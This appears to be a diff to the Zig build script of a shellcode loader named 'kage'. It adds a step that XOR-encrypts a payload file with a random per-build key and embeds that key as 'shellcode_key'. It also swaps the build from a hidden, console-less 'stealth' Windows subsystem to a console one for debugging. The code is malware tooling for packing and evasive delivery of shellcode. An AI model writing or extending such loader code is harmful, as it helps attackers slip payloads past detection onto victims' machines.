@@ -13,6 +13,12 @@ pub fn build(b: *std.Build) void {
     rng.random().bytes(&key);
     const key_u128 = std.mem.readInt(u128, &key, .little);
 
+    // encrypt payload.bin with per-build key, write to src/payload_enc.bin.
+    const buf = b.allocator.alloc(u8, 100_000_000) catch @panic("OOM");
+    const payload_enc = b.build_root.handle.readFile(b.graph.io, "src/payload.bin", buf) catch @panic("payload.bin missing or too large");
+    for (payload_enc, 0..) |*bte, i| bte.* ^= key[i % key.len];
+    b.build_root.handle.writeFile(b.graph.io, .{ .sub_path = "src/payload_enc.bin", .data = payload_enc }) catch @panic("write failed");
+
     const options = b.addOptions();
     options.addOption(u128, "shellcode_key", key_u128);
 
@@ -28,8 +34,7 @@ pub fn build(b: *std.Build) void {
         .name = "kage",
         .root_module = module,
     });
-    // .Windows = no console window (stealth). Change to .Console for debug output.
-    exe.subsystem = .Windows;
+    exe.subsystem = .Console;
 
     b.installArtifact(exe);
 
